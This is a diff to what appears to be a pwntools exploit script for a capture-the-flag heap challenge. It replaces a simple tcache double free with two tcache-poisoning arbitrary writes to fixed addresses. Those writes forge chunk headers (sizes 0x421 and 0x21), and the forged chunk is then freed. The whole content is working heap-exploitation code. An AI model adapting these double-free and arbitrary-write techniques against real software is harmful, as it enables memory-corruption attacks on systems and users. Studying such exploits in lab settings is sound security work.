@@ -31,21 +31,33 @@ def Info():
 	
 
 # Setup - Name input
-p.sendlineafter(b'Name:', b'AAAAAAAA')
+p.sendlineafter(b'Name:', b'AAAA')
 
-# Double Free into tcache
-Malloc(b'32', b'BBBB')
+# 1st Arbitrary write
+Malloc(b'80', b'AAAA')
 Free()
 Free()
+target_addr1 = p64(0x00602050)
+Malloc(b'80', target_addr1)
+Malloc(b'80', b'AAAA')
+payload1 = p64(0x0) + p64(0x421) + b'A' * 40 + p64(0x0602060)
+Malloc(b'80', payload1)
+print("[*] 1st arbitrary write complete")
 
-print("[*] Double Free")
-
-Malloc(b'32', b'\x60\x20\x60\x00')
-Malloc(b'32', b'BBBB')
+# 2nd Arbitrary write
+Malloc(b'64', b'AAAA')
+Free()
+Free()
+target_addr2 = p64(0x00602470)
+Malloc(b'64', target_addr2)
+Malloc(b'64', b'AAAA')
+payload2 = p64(0x0) + p64(0x21) + b'A' * 16 + p64(0x0) + p64(0x21)
+Malloc(b'64', payload2)
+print("[*] 2nd arbitrary write complete")
 
 Info()
-
-Malloc(b'32', b'FAKE NAME')
+Free()
+print("[*] Free forged chunk")
 
 Info()
 
